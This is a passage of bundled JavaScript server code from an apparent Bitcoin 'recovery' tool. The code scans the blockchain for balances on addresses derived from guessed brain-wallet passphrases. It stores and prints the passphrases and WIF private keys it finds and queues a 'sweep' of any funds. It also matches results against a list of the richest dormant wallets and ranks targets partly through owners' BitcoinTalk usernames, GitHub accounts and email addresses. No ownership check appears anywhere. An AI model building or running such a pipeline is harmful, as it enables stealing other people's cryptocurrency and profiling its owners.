  if (!coinbaseTx.vin || coinbaseTx.vin.length === 0 || !coinbaseTx.vin[0].is_coinbase) {
    return null;
  }
  const coinbase = coinbaseTx.vin[0];
  const scriptsig = coinbase.scriptsig || "";
  if (scriptsig.length < 10) {
    return "satoshi-v0.1";
  }
  if (scriptsig.includes("slush") || scriptsig.includes("Slush")) return "slushpool";
  if (scriptsig.includes("eligius") || scriptsig.includes("Eligius")) return "eligius";
  if (scriptsig.includes("btcguild") || scriptsig.includes("BTCGuild")) return "btcguild";
  if (scriptsig.length > 100) return "custom-large";
  if (scriptsig.length > 50) return "custom-medium";
  return "unknown";
}
async function loadBalanceChanges() {
  try {
    const fs19 = await import("fs/promises");
    const data = await fs19.readFile(BALANCE_CHANGES_FILE, "utf-8");
    const saved = JSON.parse(data);
    balanceChanges.push(...saved);
    console.log(`[BlockchainScanner] Loaded ${balanceChanges.length} balance change events from disk`);
  } catch {
  }
}
async function saveBalanceChanges() {
  try {
    const fs19 = await import("fs/promises");
    await fs19.mkdir("data", { recursive: true });
    await fs19.writeFile(BALANCE_CHANGES_FILE, JSON.stringify(balanceChanges, null, 2));
  } catch (error) {
    console.error("[BlockchainScanner] Error saving balance changes:", error);
  }
}
async function loadBalanceHits() {
  const dbHitsMap = /* @__PURE__ */ new Map();
  const jsonHitsMap = /* @__PURE__ */ new Map();
  try {
    if (db) {
      const rows = await db.select().from(balanceHits);
      for (const row of rows) {
        dbHitsMap.set(row.address, {
          address: row.address,
          passphrase: row.passphrase,
          wif: row.wif,
          balanceSats: row.balanceSats,
          balanceBTC: row.balanceBtc,
          txCount: row.txCount,
          discoveredAt: row.discoveredAt.toISOString(),
          isCompressed: row.isCompressed,
          lastChecked: row.lastChecked?.toISOString(),
          previousBalanceSats: row.previousBalanceSats ?? void 0,
          balanceChanged: row.balanceChanged ?? void 0,
          changeDetectedAt: row.changeDetectedAt?.toISOString()
        });
      }
      console.log(`[BlockchainScanner] Loaded ${dbHitsMap.size} balance hits from PostgreSQL`);
    }
  } catch (error) {
    console.error("[BlockchainScanner] Error loading from PostgreSQL:", error);
  }
  try {
    const fs19 = await import("fs/promises");
    const data = await fs19.readFile(BALANCE_HITS_FILE, "utf-8");
    const saved = JSON.parse(data);
    for (const hit of saved) {
      jsonHitsMap.set(hit.address, hit);
    }
    console.log(`[BlockchainScanner] Loaded ${jsonHitsMap.size} balance hits from JSON backup`);
  } catch {
  }
  const mergedMap = /* @__PURE__ */ new Map();
  for (const [addr, hit] of dbHitsMap) {
    mergedMap.set(addr, hit);
  }
  const missingInDb = [];
  for (const [addr, hit] of jsonHitsMap) {
    if (!mergedMap.has(addr)) {
      mergedMap.set(addr, hit);
      missingInDb.push(hit);
    }
  }
  balanceHits2.length = 0;
  balanceHits2.push(...mergedMap.values());
  if (missingInDb.length > 0 && db) {
    console.log(`[BlockchainScanner] Found ${missingInDb.length} balance hits in JSON but not DB - syncing...`);
    let synced = 0;
    let failed = 0;
    for (const hit of missingInDb) {
      try {
        await saveBalanceHitToDb(hit);
        synced++;
      } catch (syncError) {
        failed++;
        console.error(`[BlockchainScanner] Failed to sync ${hit.address} to PostgreSQL:`, syncError);
      }
    }
    if (synced > 0) {
      console.log(`[BlockchainScanner] Synced ${synced} JSON-only balance hits to PostgreSQL`);
    }
    if (failed > 0) {
      console.warn(`[BlockchainScanner] WARNING: ${failed} balance hits failed to sync to PostgreSQL - will retry on next restart`);
    }
  }
  console.log(`[BlockchainScanner] Total balance hits loaded: ${balanceHits2.length} (${dbHitsMap.size} from DB, ${missingInDb.length} recovered from JSON)`);
}
async function saveBalanceHits() {
  try {
    const fs19 = await import("fs/promises");
    await fs19.mkdir("data", { recursive: true });
    await fs19.writeFile(BALANCE_HITS_FILE, JSON.stringify(balanceHits2, null, 2));
    console.log(`[BlockchainScanner] Saved ${balanceHits2.length} balance hits to disk backup`);
  } catch (error) {
    console.error("[BlockchainScanner] Error saving balance hits to disk:", error);
  }
}
async function saveBalanceHitToDb(hit, userId = DEFAULT_USER_ID) {
  if (!db) return;
  try {
    const existing = await db.select().from(balanceHits).where(eq4(balanceHits.address, hit.address)).limit(1);
    if (existing.length > 0) {
      await db.update(balanceHits).set({
        balanceSats: hit.balanceSats,
        balanceBtc: hit.balanceBTC,
        txCount: hit.txCount,
        lastChecked: hit.lastChecked ? new Date(hit.lastChecked) : null,
        previousBalanceSats: hit.previousBalanceSats ?? null,
        balanceChanged: hit.balanceChanged ?? false,
        changeDetectedAt: hit.changeDetectedAt ? new Date(hit.changeDetectedAt) : null,
        updatedAt: /* @__PURE__ */ new Date(),
        // Update recovery metadata if provided
        recoveryType: hit.recoveryType ?? existing[0].recoveryType ?? "unknown",
        isDormantConfirmed: hit.isDormantConfirmed ?? existing[0].isDormantConfirmed ?? false,
        dormantConfirmedAt: hit.dormantConfirmedAt ? new Date(hit.dormantConfirmedAt) : existing[0].dormantConfirmedAt,
        originalInput: hit.originalInput ?? existing[0].originalInput,
        derivationPath: hit.derivationPath ?? existing[0].derivationPath,
        mnemonicWordCount: hit.mnemonicWordCount ?? existing[0].mnemonicWordCount
      }).where(eq4(balanceHits.address, hit.address));
    } else {
      await db.insert(balanceHits).values({
        userId,
        address: hit.address,
        passphrase: hit.passphrase,
        wif: hit.wif,
        balanceSats: hit.balanceSats,
        balanceBtc: hit.balanceBTC,
        txCount: hit.txCount,
        isCompressed: hit.isCompressed,
        discoveredAt: new Date(hit.discoveredAt),
        lastChecked: hit.lastChecked ? new Date(hit.lastChecked) : null,
        previousBalanceSats: hit.previousBalanceSats ?? null,
        balanceChanged: hit.balanceChanged ?? false,
        changeDetectedAt: hit.changeDetectedAt ? new Date(hit.changeDetectedAt) : null,
        // Recovery tracking fields
        recoveryType: hit.recoveryType ?? "unknown",
        isDormantConfirmed: hit.isDormantConfirmed ?? false,
        dormantConfirmedAt: hit.dormantConfirmedAt ? new Date(hit.dormantConfirmedAt) : null,
        originalInput: hit.originalInput ?? null,
        derivationPath: hit.derivationPath ?? null,
        mnemonicWordCount: hit.mnemonicWordCount ?? null
      });
      console.log(`[BlockchainScanner] Saved balance hit to PostgreSQL: ${hit.address} (type: ${hit.recoveryType ?? "unknown"})`);
    }
  } catch (error) {
    console.error("[BlockchainScanner] Error saving to PostgreSQL:", error);
  }
}
async function saveBalanceChangeEventToDb(address, previousBalance, newBalance, balanceHitId) {
  if (!db) return;
  try {
    await db.insert(balanceChangeEvents).values({
      balanceHitId: balanceHitId ?? null,
      address,
      previousBalanceSats: previousBalance,
      newBalanceSats: newBalance,
      deltaSats: newBalance - previousBalance,
      detectedAt: /* @__PURE__ */ new Date()
    });
    console.log(`[BlockchainScanner] Saved balance change event to PostgreSQL: ${address}`);
  } catch (error) {
    console.error("[BlockchainScanner] Error saving balance change event to PostgreSQL:", error);
  }
}
async function fetchAddressBalance(address) {
  try {
    const data = await getAddressData(address);
    if (!data) {
      console.log("[BlockchainScanner] API router failed, falling back to direct Blockstream API");
      const response = await fetch(`${BLOCKSTREAM_API2}/address/${address}`);
      if (!response.ok) {
        if (response.status === 404) {
          return { balanceSats: 0, txCount: 0, funded: 0, spent: 0 };
        }
        return null;
      }
      const rawData = await response.json();
      const funded = (rawData.chain_stats?.funded_txo_sum || 0) + (rawData.mempool_stats?.funded_txo_sum || 0);
      const spent = (rawData.chain_stats?.spent_txo_sum || 0) + (rawData.mempool_stats?.spent_txo_sum || 0);
      const balanceSats = funded - spent;
      const txCount = (rawData.chain_stats?.tx_count || 0) + (rawData.mempool_stats?.tx_count || 0);
      return { balanceSats, txCount, funded, spent };
    }
    return {
      balanceSats: data.balance,
      txCount: data.txCount,
      funded: data.totalReceived,
      spent: data.totalSent
    };
  } catch (error) {
    console.error(`[BlockchainScanner] Error fetching balance for ${address}:`, error);
    return null;
  }
}
async function checkAndRecordBalance(addressOrOptions, passphrase, wif, isCompressed = true, recoveryType = "brain_wallet") {
  let opts;
  if (typeof addressOrOptions === "string") {
    opts = {
      address: addressOrOptions,
      passphrase,
      wif,
      isCompressed,
      recoveryType
    };
  } else {
    opts = addressOrOptions;
  }
  const balanceInfo = await fetchAddressBalance(opts.address);
  if (!balanceInfo) {
    return null;
  }
  if (balanceInfo.balanceSats > 0 || balanceInfo.txCount > 0) {
    const hit = {
      address: opts.address,
      passphrase: opts.passphrase,
      wif: opts.wif,
      balanceSats: balanceInfo.balanceSats,
      balanceBTC: (balanceInfo.balanceSats / 1e8).toFixed(8),
      txCount: balanceInfo.txCount,
      discoveredAt: (/* @__PURE__ */ new Date()).toISOString(),
      isCompressed: opts.isCompressed ?? true,
      recoveryType: opts.recoveryType ?? "brain_wallet",
      originalInput: opts.originalInput,
      derivationPath: opts.derivationPath,
      mnemonicWordCount: opts.mnemonicWordCount
    };
    const existing = balanceHits2.find((h) => h.address === opts.address);
    if (!existing) {
      balanceHits2.push(hit);
      await saveBalanceHitToDb(hit);
      await saveBalanceHits();
      const typeLabel = opts.recoveryType ? `[${opts.recoveryType}]` : "";
      if (balanceInfo.balanceSats > 0) {
        console.log(`
\u{1F3AF} [BALANCE HIT] ${typeLabel} ${opts.address}`);
        console.log(`   \u{1F4B0} Balance: ${hit.balanceBTC} BTC (${hit.balanceSats} sats)`);
        console.log(`   \u{1F511} Passphrase: "${opts.passphrase}"`);
        console.log(`   \u{1F510} WIF: ${opts.wif}`);
        console.log(`   \u{1F4CA} TX Count: ${hit.txCount}`);
        if (opts.derivationPath) console.log(`   \u{1F4CD} Path: ${opts.derivationPath}`);
        console.log("");
        try {
          await sweepApprovalService.createPendingSweep({
            address: opts.address,
            passphrase: opts.passphrase,
            wif: opts.wif,
            isCompressed: opts.isCompressed ?? true,
            balanceSats: balanceInfo.balanceSats,
            source: "typescript",
            recoveryType: opts.recoveryType
          });
        } catch (sweepError) {
          console.error(`[BlockchainScanner] Failed to create pending sweep:`, sweepError);
        }
      } else {
        console.log(`[BlockchainScanner] Historical activity ${typeLabel}: ${opts.address} (${hit.txCount} txs, 0 balance)`);
      }
    }
    return hit;
  }
  return null;
}
function getBalanceHits() {
  return [...balanceHits2];
}
function getActiveBalanceHits() {
  return balanceHits2.filter((h) => h.balanceSats > 0);
}
function getBalanceChanges() {
  return [...balanceChanges];
}
async function saveBalanceHit(hit) {
  const existingIndex = balanceHits2.findIndex((h) => h.address === hit.address);
  if (existingIndex >= 0) {
    balanceHits2[existingIndex] = hit;
  } else {
    balanceHits2.push(hit);
  }
  let dbError = null;
  let jsonError = null;
  try {
    await saveBalanceHitToDbStrict(hit);
  } catch (e) {
    dbError = e;
    console.error("[BlockchainScanner] PostgreSQL save failed, will try JSON fallback:", e);
  }
  try {
    await saveBalanceHits();
  } catch (e) {
    jsonError = e;
    console.error("[BlockchainScanner] JSON backup save failed:", e);
  }
  if (dbError && jsonError) {
    throw new Error(`Balance hit persistence failed: DB: ${dbError.message}, JSON: ${jsonError.message}`);
  }
  if (dbError && !jsonError) {
    console.warn("[BlockchainScanner] Balance hit saved to JSON but PostgreSQL failed - will retry on next load");
  }
}
async function saveBalanceHitToDbStrict(hit, userId = DEFAULT_USER_ID) {
  if (!db) {
    throw new Error("Database not connected");
  }
  const existing = await db.select().from(balanceHits).where(eq4(balanceHits.address, hit.address)).limit(1);
  if (existing.length > 0) {
    await db.update(balanceHits).set({
      balanceSats: hit.balanceSats,
      balanceBtc: hit.balanceBTC,
      txCount: hit.txCount,
      lastChecked: hit.lastChecked ? new Date(hit.lastChecked) : null,
      previousBalanceSats: hit.previousBalanceSats ?? null,
      balanceChanged: hit.balanceChanged ?? false,
      changeDetectedAt: hit.changeDetectedAt ? new Date(hit.changeDetectedAt) : null,
      updatedAt: /* @__PURE__ */ new Date(),
      recoveryType: hit.recoveryType ?? existing[0].recoveryType ?? "unknown",
      isDormantConfirmed: hit.isDormantConfirmed ?? existing[0].isDormantConfirmed ?? false,
      dormantConfirmedAt: hit.dormantConfirmedAt ? new Date(hit.dormantConfirmedAt) : existing[0].dormantConfirmedAt,
      originalInput: hit.originalInput ?? existing[0].originalInput,
      derivationPath: hit.derivationPath ?? existing[0].derivationPath,
      mnemonicWordCount: hit.mnemonicWordCount ?? existing[0].mnemonicWordCount
    }).where(eq4(balanceHits.address, hit.address));
  } else {
    await db.insert(balanceHits).values({
      userId,
      address: hit.address,
      passphrase: hit.passphrase,
      wif: hit.wif,
      balanceSats: hit.balanceSats,
      balanceBtc: hit.balanceBTC,
      txCount: hit.txCount,
      isCompressed: hit.isCompressed,
      discoveredAt: new Date(hit.discoveredAt),
      lastChecked: hit.lastChecked ? new Date(hit.lastChecked) : null,
      previousBalanceSats: hit.previousBalanceSats ?? null,
      balanceChanged: hit.balanceChanged ?? false,
      changeDetectedAt: hit.changeDetectedAt ? new Date(hit.changeDetectedAt) : null,
      recoveryType: hit.recoveryType ?? "unknown",
      isDormantConfirmed: hit.isDormantConfirmed ?? false,
      dormantConfirmedAt: hit.dormantConfirmedAt ? new Date(hit.dormantConfirmedAt) : null,
      originalInput: hit.originalInput ?? null,
      derivationPath: hit.derivationPath ?? null,
      mnemonicWordCount: hit.mnemonicWordCount ?? null
    });
    console.log(`[BlockchainScanner] Saved balance hit to PostgreSQL: ${hit.address} (type: ${hit.recoveryType ?? "unknown"})`);
  }
}
async function refreshSingleBalance(address) {
  const hit = balanceHits2.find((h) => h.address === address);
  if (!hit) {
    return { updated: false, changed: false, hit: null, error: "Address not found in balance hits" };
  }
  const balanceInfo = await fetchAddressBalance(address);
  if (!balanceInfo) {
    return { updated: false, changed: false, hit, error: "Failed to fetch balance from API" };
  }
  const previousBalance = hit.balanceSats;
  const newBalance = balanceInfo.balanceSats;
  const now = (/* @__PURE__ */ new Date()).toISOString();
  hit.lastChecked = now;
  hit.previousBalanceSats = previousBalance;
  if (previousBalance !== newBalance) {
    hit.balanceChanged = true;
    hit.changeDetectedAt = now;
    hit.balanceSats = newBalance;
    hit.balanceBTC = (newBalance / 1e8).toFixed(8);
    hit.txCount = balanceInfo.txCount;
    const changeEvent = {
      address,
      previousBalance,
      newBalance,
      difference: newBalance - previousBalance,
      detectedAt: now,
      passphrase: hit.passphrase,
      wif: hit.wif
    };
    balanceChanges.push(changeEvent);
    await saveBalanceChanges();
    const direction = newBalance > previousBalance ? "\u{1F4C8} INCREASED" : "\u{1F4C9} DECREASED";
    const diffBTC = Math.abs(newBalance - previousBalance) / 1e8;
    console.log(`
\u26A0\uFE0F  [BALANCE CHANGE] ${address}`);
    console.log(`   ${direction}: ${previousBalance / 1e8} \u2192 ${newBalance / 1e8} BTC`);
    console.log(`   Difference: ${diffBTC.toFixed(8)} BTC`);
    console.log(`   \u{1F511} Passphrase: "${hit.passphrase}"`);
    console.log(`   \u{1F510} WIF: ${hit.wif}
`);
    await saveBalanceChangeEventToDb(address, previousBalance, newBalance);
    await saveBalanceHitToDb(hit);
    await saveBalanceHits();
    return { updated: true, changed: true, hit };
  }
  hit.balanceChanged = false;
  await saveBalanceHitToDb(hit);
  await saveBalanceHits();
  return { updated: true, changed: false, hit };
}
async function refreshAllBalances(options) {
  const startTime2 = Date.now();
  const delayMs = options?.delayMs ?? 1e3;
  let refreshed = 0;
  let changed = 0;
  let errors = 0;
  const newChanges = [];
  console.log(`[BlockchainScanner] Starting balance refresh for ${balanceHits2.length} addresses...`);
  for (let i = 0; i < balanceHits2.length; i++) {
    const hit = balanceHits2[i];
    if (options?.onProgress) {
      options.onProgress(i + 1, balanceHits2.length, hit.address);
    }
    const result = await refreshSingleBalance(hit.address);
    if (result.error) {
      errors++;
      console.error(`[BlockchainScanner] Error refreshing ${hit.address}: ${result.error}`);
    } else if (result.updated) {
      refreshed++;
      if (result.changed) {
        changed++;
        const latestChange = balanceChanges[balanceChanges.length - 1];
        if (latestChange) {
          newChanges.push(latestChange);
        }
      }
    }
    if (i < balanceHits2.length - 1 && delayMs > 0) {
      await new Promise((resolve) => setTimeout(resolve, delayMs));
    }
  }
  const duration = Date.now() - startTime2;
  console.log(`[BlockchainScanner] Balance refresh complete:`);
  console.log(`   Total: ${balanceHits2.length}, Refreshed: ${refreshed}, Changed: ${changed}, Errors: ${errors}`);
  console.log(`   Duration: ${(duration / 1e3).toFixed(1)}s`);
  if (changed > 0) {
    console.log(`
\u{1F6A8} [ALERT] ${changed} balance(s) have changed!`);
  }
  return {
    total: balanceHits2.length,
    refreshed,
    changed,
    errors,
    changes: newChanges,
    duration
  };
}
function getLastBalanceCheck() {
  const lastCheckedDates = balanceHits2.filter((h) => h.lastChecked).map((h) => new Date(h.lastChecked).getTime());
  if (lastCheckedDates.length === 0) return null;
  const mostRecent = Math.max(...lastCheckedDates);
  return new Date(mostRecent).toISOString();
}
function getStaleBalanceHits(maxAgeMinutes = 30) {
  const threshold = Date.now() - maxAgeMinutes * 60 * 1e3;
  return balanceHits2.filter((h) => {
    if (!h.lastChecked) return true;
    return new Date(h.lastChecked).getTime() < threshold;
  });
}
async function fetchBlockByHeight(height) {
  try {
    const hashResponse = await fetch(`${BLOCKSTREAM_API2}/block-height/${height}`);
    if (!hashResponse.ok) return null;
    const blockHash = await hashResponse.text();
    const blockResponse = await fetch(`${BLOCKSTREAM_API2}/block/${blockHash}`);
    if (!blockResponse.ok) return null;
    const block = await blockResponse.json();
    return block;
  } catch (error) {
    console.error(`[BlockchainScanner] Error fetching block ${height}:`, error);
    return null;
  }
}
async function fetchBlockTransactions(blockHash) {
  try {
    const response = await fetch(`${BLOCKSTREAM_API2}/block/${blockHash}/txs`);
    if (!response.ok) return [];
    const txs = await response.json();
    return txs;
  } catch (error) {
    console.error(`[BlockchainScanner] Error fetching transactions for block ${blockHash}:`, error);
    return [];
  }
}
function parseBlock(blockData) {
  const temporal = extractTemporalSignature(blockData);
  return {
    height: blockData.height,
    hash: blockData.id,
    previousHash: blockData.previousblockhash,
    timestamp: new Date(blockData.timestamp * 1e3),
    difficulty: blockData.difficulty.toString(),
    // Store as string to preserve precision
    nonce: blockData.nonce,
    // Schema uses { mode: "number" } for nonce
    transactionCount: blockData.tx_count,
    dayOfWeek: temporal.dayOfWeek,
    hourUTC: temporal.hourUTC,
    likelyTimezones: temporal.likelyTimezones,
    minerSoftwareFingerprint: null
    // Extracted from coinbase later
  };
}
function parseTransaction(txData) {
  const isCoinbase = txData.vin.some((input) => input.is_coinbase);
  let totalOutputValue = BigInt(0);
  for (const output of txData.vout) {
    totalOutputValue += BigInt(output.value);
  }
  return {
    txid: txData.txid,
    blockHeight: txData.status.block_height,
    blockTimestamp: new Date(txData.status.block_time * 1e3),
    isCoinbase,
    inputCount: txData.vin.length,
    outputCount: txData.vout.length,
    totalInputValue: isCoinbase ? BigInt(0) : null,
    // Requires UTXO resolution
    totalOutputValue,
    fee: txData.fee ? BigInt(txData.fee) : BigInt(0)
    // Blockstream provides this directly
  };
}
async function scanEarlyEraBlocks(startHeight = 0, endHeight = 1e3, onProgress) {
  console.log(`[BlockchainScanner] Starting scan from block ${startHeight} to ${endHeight}`);
  for (let height = startHeight; height <= endHeight; height++) {
    if (onProgress) onProgress(height, endHeight - startHeight);
    const blockData = await fetchBlockByHeight(height);
    if (!blockData) {
      console.error(`[BlockchainScanner] Failed to fetch block ${height}`);
      continue;
    }
    const txs = await fetchBlockTransactions(blockData.id);
    console.log(`[BlockchainScanner] Block ${height} has ${txs.length} transactions`);
    const blockToSave = parseBlock(blockData);
    const coinbaseTx = txs.find((tx) => tx.vin.some((input) => input.is_coinbase));
    if (coinbaseTx) {
      blockToSave.minerSoftwareFingerprint = extractMinerFingerprint(coinbaseTx);
    }
    try {
      await observerStorage.saveBlock(blockToSave);
      console.log(`[BlockchainScanner] \u2713 Saved block ${height}: ${blockToSave.hash}${blockToSave.minerSoftwareFingerprint ? ` (miner: ${blockToSave.minerSoftwareFingerprint})` : ""}`);
    } catch (error) {
      console.error(`[BlockchainScanner] Error saving block ${height}:`, error);
      continue;
    }
    for (let position = 0; position < txs.length; position++) {
      const txData = txs[position];
      const tx = parseTransaction(txData);
      try {
        await observerStorage.saveTransaction(tx);
        for (const output of txData.vout) {
          let address = output.scriptpubkey_address || null;
          if (!address && output.scriptpubkey) {
            address = deriveP2PKAddress(output.scriptpubkey);
            if (address) {
              console.log(`[BlockchainScanner]   \u2192 Derived P2PK address: ${address}`);
            }
          }
          if (!address) {
            console.log(`[BlockchainScanner]   \u26A0 Skipped output: no address (script: ${output.scriptpubkey?.substring(0, 20)}...)`);
            continue;
          }
          const scriptSig = extractScriptSignature(output.scriptpubkey);
          const temporal = extractTemporalSignature(blockData);
          const valueSig = extractValueSignature(txData.vout);
          const addressRecord = {
            address,
            firstSeenHeight: height,
            firstSeenTxid: txData.txid,
            firstSeenTimestamp: new Date(blockData.timestamp * 1e3),
            lastActivityHeight: height,
            lastActivityTxid: txData.txid,
            lastActivityTimestamp: new Date(blockData.timestamp * 1e3),
            currentBalance: BigInt(output.value),
            // Balance tracking (proper UTXO tracking in Phase 2)
            dormancyBlocks: 0,
            // Will be calculated by dormancy-updater
            isDormant: false,
            isCoinbaseReward: txData.vin.some((input) => input.is_coinbase),
            isEarlyEra: height <= 155e3,
            // 2009-2011 era
            temporalSignature: {
              dayOfWeek: temporal.dayOfWeek,
              hourUTC: temporal.hourUTC,
              dayPattern: temporal.dayPattern,
              hourPattern: temporal.hourPattern,
              likelyTimezones: temporal.likelyTimezones,
              timestamp: temporal.timestamp
            },
            graphSignature: {
              // Basic graph features (will be enriched with multi-block analysis in Phase 2)
              inputCount: txData.vin.length,
              outputCount: txData.vout.length,
              isFirstOutput: txData.vout.indexOf(output) === 0
            },
            valueSignature: {
              initialValue: output.value,
              totalValue: valueSig.totalValue,
              hasRoundNumbers: valueSig.hasRoundNumbers,
              isCoinbase: txData.vin.some((input) => input.is_coinbase),
              outputCount: valueSig.outputCount
            },
            scriptSignature: {
              type: scriptSig.type,
              raw: scriptSig.raw,
              softwareFingerprint: scriptSig.softwareFingerprint
            }
          };
          await observerStorage.saveAddress(addressRecord);
          console.log(`[BlockchainScanner]   \u2192 Saved address: ${address} (${scriptSig.type}, ${output.value} sats)`);
        }
      } catch (error) {
        console.error(`[BlockchainScanner] Error processing tx ${txData.txid}:`, error);
      }
    }
    await new Promise((resolve) => setTimeout(resolve, 200));
  }
  console.log(`[BlockchainScanner] \u2713 Scan complete: blocks ${startHeight} to ${endHeight}`);
  await updateAddressDormancy(endHeight);
}
function computeKappaRecovery(address) {
  let phiConstraints = 0;
  if (address.temporalSignature) {
    const temporal = address.temporalSignature;
    if (temporal.dayOfWeek !== void 0) phiConstraints += 0.1;
    if (temporal.hourUTC !== void 0) phiConstraints += 0.1;
    if (temporal.likelyTimezones?.length) phiConstraints += 0.2;
  }
  if (address.graphSignature) {
    const graph = address.graphSignature;
    if (graph.inputAddresses?.length) phiConstraints += 0.2;
    if (graph.clusterSize > 1) phiConstraints += 0.3;
  }
  if (address.isCoinbaseReward) phiConstraints += 0.5;
  if (address.valueSignature) {
    const value = address.valueSignature;
    if (value.hasRoundNumbers) phiConstraints += 0.2;
  }
  if (address.scriptSignature) {
    const script = address.scriptSignature;
    if (script.type === "P2PK") phiConstraints += 0.3;
  }
  let hCreation = address.isEarlyEra ? 2 : 4;
  if (address.currentBalance && address.currentBalance > BigInt(5e9)) {
    hCreation += 1;
  }
  const kappaRecovery = phiConstraints / hCreation;
  let tier = "challenging";
  if (kappaRecovery > 0.5) tier = "high";
  else if (kappaRecovery > 0.2) tier = "medium";
  else if (kappaRecovery > 0.1) tier = "low";
  return {
    kappaRecovery,
    phiConstraints,
    hCreation,
    tier
  };
}
var DEFAULT_USER_ID, BLOCKSTREAM_API2, balanceChanges, BALANCE_CHANGES_FILE, balanceHits2, BALANCE_HITS_FILE;
var init_blockchain_scanner = __esm({
  "server/blockchain-scanner.ts"() {
    "use strict";
    init_schema();
    init_observer_storage();
    init_dormancy_updater();
    init_db();
    init_blockchain_api_router();
    init_sweep_approval();
    DEFAULT_USER_ID = "36468785";
    BLOCKSTREAM_API2 = "https://blockstream.info/api";
    balanceChanges = [];
    BALANCE_CHANGES_FILE = "data/balance-changes.json";
    loadBalanceChanges();
    balanceHits2 = [];
    BALANCE_HITS_FILE = "data/balance-hits.json";
    loadBalanceHits();
  }
});

// server/dormant-cross-ref.ts
var dormant_cross_ref_exports = {};
__export(dormant_cross_ref_exports, {
  dormantCrossRef: () => dormantCrossRef
});
import * as fs from "fs";
import * as path from "path";
var DormantCrossRef, dormantCrossRef;
var init_dormant_cross_ref = __esm({
  "server/dormant-cross-ref.ts"() {
    "use strict";
    DormantCrossRef = class {
      addressSet = /* @__PURE__ */ new Set();
      addressMap = /* @__PURE__ */ new Map();
      loaded = false;
      matches = [];
      matchesFile = "data/dormant-matches.json";
      constructor() {
        this.loadFromFile();
        this.loadMatches();
      }
      loadFromFile() {
        try {
          const filePath = path.join(process.cwd(), "attached_assets/Pasted-Rank-Address-Wallet-Label-Balance-BTC-Balance-USD-Pct-o_1764727596104.txt");
          if (!fs.existsSync(filePath)) {
            console.log("[DormantCrossRef] Dormant addresses file not found");
            return;
          }
          const content = fs.readFileSync(filePath, "utf-8");
          const lines = content.split("\n");
          let parsed = 0;
          for (let i = 1; i < lines.length; i++) {
            const line = lines[i].trim();
            if (!line) continue;
            const parts = line.split("	");
            if (parts.length < 2) continue;
            const rank = parseInt(parts[0], 10);
            const address = parts[1]?.trim();
            if (!address || !address.startsWith("1") && !address.startsWith("3") && !address.startsWith("bc1")) {
              continue;
            }
            const info = {
              rank,
              address,
              walletLabel: parts[2]?.trim() || "",
              balanceBTC: parts[3]?.trim() || "",
              balanceUSD: parts[4]?.trim() || "",
              pctOfCoins: parts[5]?.trim() || "",
              firstIn: parts[6]?.trim() || "",
              lastIn: parts[7]?.trim() || "",
              classification: parts[12]?.trim() || "",
              analysisNotes: parts[13]?.trim() || ""
            };
            this.addressSet.add(address);
            this.addressMap.set(address, info);
            parsed++;
          }
          this.loaded = true;
          console.log(`[DormantCrossRef] Loaded ${parsed} dormant addresses for cross-reference`);
        } catch (error) {
          console.error("[DormantCrossRef] Error loading dormant addresses:", error);
        }
      }
      loadMatches() {
        try {
          if (fs.existsSync(this.matchesFile)) {
            const data = fs.readFileSync(this.matchesFile, "utf-8");
            this.matches = JSON.parse(data);
            console.log(`[DormantCrossRef] Loaded ${this.matches.length} previous matches`);
          }
        } catch (error) {
          console.error("[DormantCrossRef] Error loading matches:", error);
        }
      }
      saveMatches() {
        try {
          const dir = path.dirname(this.matchesFile);
          if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
          }
          fs.writeFileSync(this.matchesFile, JSON.stringify(this.matches, null, 2));
        } catch (error) {
          console.error("[DormantCrossRef] Error saving matches:", error);
        }
      }
      isKnownDormant(address) {
        return this.addressSet.has(address);
      }
      getInfo(address) {
        return this.addressMap.get(address) || null;
      }
      checkAddress(address) {
        const isMatch = this.addressSet.has(address);
        const info = isMatch ? this.addressMap.get(address) || null : null;
        if (isMatch && info) {
          const alreadyRecorded = this.matches.some((m) => m.address === address);
          if (!alreadyRecorded) {
            this.matches.push(info);
            this.saveMatches();
            console.log(`[DormantCrossRef] \u{1F3AF} MATCH FOUND: ${address} (Rank #${info.rank}, ${info.balanceBTC} BTC)`);
          }
        }
        return { isMatch, info };
      }
      checkAddresses(addresses2) {
        const newMatches = [];
        for (const address of addresses2) {
          const result = this.checkAddress(address);
          if (result.isMatch && result.info) {
            newMatches.push(result.info);
          }
        }
        return { matches: newMatches, checked: addresses2.length };
      }
      getStats() {
        return {
          totalDormant: this.addressSet.size,
          loaded: this.loaded,
          matchesFound: this.matches.length,
          topMatches: this.matches.slice(0, 10)
        };
      }
      getAllMatches() {
        return [...this.matches];
      }
      getTopDormant(limit = 100) {
        const sorted = Array.from(this.addressMap.values()).filter((info) => info.classification.includes("Dormant") || info.classification.includes("Lost")).sort((a, b) => a.rank - b.rank);
        return sorted.slice(0, limit);
      }
      /**
       * Get ALL addresses from the top dormant wallets list (no classification filter)
       * This returns all ~999 addresses from the imported data
       */
      getAllDormantAddresses(limit = 1e3) {
        const sorted = Array.from(this.addressMap.values()).sort((a, b) => a.rank - b.rank);
        return sorted.slice(0, limit);
      }
      getTotalValue() {
        let btc = 0;
        let usd = 0;
        const values = Array.from(this.addressMap.values());
        for (const info of values) {
          const btcMatch = info.balanceBTC.replace(/,/g, "").match(/[\d.]+/);
          const usdMatch = info.balanceUSD.replace(/,/g, "").match(/[\d.]+/);
          if (btcMatch) btc += parseFloat(btcMatch[0]);
          if (usdMatch) usd += parseFloat(usdMatch[0]);
        }
        return { btc, usd };
      }
    };
    dormantCrossRef = new DormantCrossRef();
  }
});

// server/kappa-recovery-solver.ts
var kappa_recovery_solver_exports = {};
__export(kappa_recovery_solver_exports, {
  computeHCreation: () => computeHCreation,
  computeKappaRecovery: () => computeKappaRecovery2,
  computePhiConstraints: () => computePhiConstraints,
  rankRecoveryPriorities: () => rankRecoveryPriorities
});
function computePhiConstraints(address, entities2, artifacts2) {
  const breakdown = {
    entityLinkage: entities2.length,
    entityConfidence: 0,
    artifactDensity: 0,
    temporalPrecisionHours: 0,
    graphSignature: 0,
    clusterSize: 0,
    hasRoundNumbers: false,
    isCoinbase: address.isCoinbaseReward || false,
    valuePatternStrength: 0,
    hasSoftwareFingerprint: false,
    scriptComplexity: 0
  };
  const entityScore = Math.min(entities2.length * 10, 30);
  if (entities2.length > 0) {
    const confidenceScores = entities2.map((e) => {
      let score = 0;
      if (e.knownAddresses && e.knownAddresses.includes(address.address)) score += 0.4;
      if (e.bitcoinTalkUsername) score += 0.2;
      if (e.githubUsername) score += 0.2;
      if (e.emailAddresses && e.emailAddresses.length > 0) score += 0.2;
      return Math.min(score, 1);
    });
